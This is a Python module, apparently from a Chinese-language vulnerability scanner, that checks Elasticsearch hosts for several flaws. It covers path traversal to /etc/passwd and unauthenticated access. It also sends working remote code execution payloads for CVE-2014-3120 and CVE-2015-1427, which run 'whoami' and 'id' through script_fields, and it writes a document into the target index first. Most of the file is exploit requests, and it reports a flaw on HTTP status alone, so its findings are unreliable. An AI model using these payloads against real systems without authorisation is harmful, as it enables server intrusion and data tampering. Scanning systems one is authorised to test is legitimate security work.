# -*- encoding: utf-8 -*-
'''
@File : elasticSearch.py
@Time : 2019/07/19 17:29:45
@Author : JE2Se 
@Version : 1.0
@Contact : admin@je2se.com
@WebSite : https://www.je2se.com
'''

import requests
import json
from lib import *

def dirTravlesal(url): #ElasticSearch目录遍历漏洞
    try:
        req = requests.get(url+':9200/_plugin/head/../../../../../../../../../etc/passwd', timeout=5)
        if req.status_code == 200:
            print(Vcolors.RED + "存在ElasticSearch目录遍历漏洞" + Vcolors.ENDC)
        else:
            print(Vcolors.OKGREEN + "不存在ElasticSearch目录遍历漏洞" + Vcolors.ENDC)
    except:
        print(Vcolors.OKGREEN + "不存在ElasticSearch目录遍历漏洞" + Vcolors.ENDC)

def remoteCodeExe(url):      #CVE-2014-3120    远程命令执行
    try:
        headers = {'Content-Type':'application/x-www-form-urlencoded'}
        req = requests.post(url+':9200/website/blog/', headers=headers, data="""{"name":"test"}""", timeout=5)  # es 中至少存在一条数据, so, 创建
        # print(req.text)  # {"_index":"website","_type":"blog","_id":"gyLnhuVzSBGc9sN1g4v8iQ","_version":1,"created":true}
        data ={
                "size": 1,
                "query": {
                "filtered": {
                    "query": {
                    "match_all": {
                    }
                    }
                }
                },
                "script_fields": {
                    "command": {
                        "script": "import java.io.*;new java.util.Scanner(Runtime.getRuntime().exec(\"whoami\").getInputStream()).useDelimiter(\"\\\\A\").next();"
                    }
                }
            }

        req = requests.post(url+':9200/_search?pretty', headers=headers, data=json.dumps(data), timeout=5)
        if req.status_code == 200:
            print(Vcolors.RED + "存在CVE-2014-3120 ElasticSearch远程命令执行")
        else:
            print(Vcolors.OKGREEN + "不存在CVE-2014-3120  ElasticSearch远程命令执行")
    except:
        print(Vcolors.OKGREEN + "不存在CVE-2014-3120  ElasticSearch远程命令执行")

def remoteCodeExe1(url):      #CVE-2015-1427
    try:
        headers = {'Content-Type':'application/x-www-form-urlencoded'}
        req1 = requests.post(url+':9200/website/blog/', headers=headers, data="""{"name":"test"}""", timeout=5)  # es 中至少存在一条数据, so, 创建

        data = {"size":1, "script_fields": {"lupin":{"lang":"groovy","script": "java.lang.Math.class.forName(\"java.lang.Runtime\").getRuntime().exec(\"id\").getText()"}}}
        req = requests.post(url+':9200/_search?pretty', headers=headers, data=json.dumps(data), timeout=5)

        if req.status_code == 200:
            print(Vcolors.RED + "存在CVE-2015-1427 ElasticSearch远程命令执行" + Vcolors.ENDC)
        else:
            print(Vcolors.OKGREEN + "不存在CVE-2015-1427 ElasticSearch远程命令执行" + Vcolors.ENDC)
    except:
        print(Vcolors.OKGREEN + "不存在CVE-2015-1427 ElasticSearch远程命令执行")

def esUnauto(url):
    try:
        response = requests.get(url+":9200/_cat",timeout =5)
        if "/_cat/master" in response.content:
            print(Vcolors.RED + "存在ElasticSearch未授权访问漏洞" + Vcolors.ENDC)
        else:
            print(Vcolors.OKGREEN + "不存在ElasticSearch未授权访问漏洞" + Vcolors.ENDC)
    except:
        print(Vcolors.OKGREEN + "不存在ElasticSearch未授权访问漏洞" + Vcolors.ENDC)
def esCheck(url):
    print('\n')
    print(Vcolors.OKBLUE + "正在对目标url进行ElasticSearch漏洞探测~~" + Vcolors.ENDC)
    dirTravlesal(url)
    remoteCodeExe(url)
    remoteCodeExe1(url)
    esUnauto(url)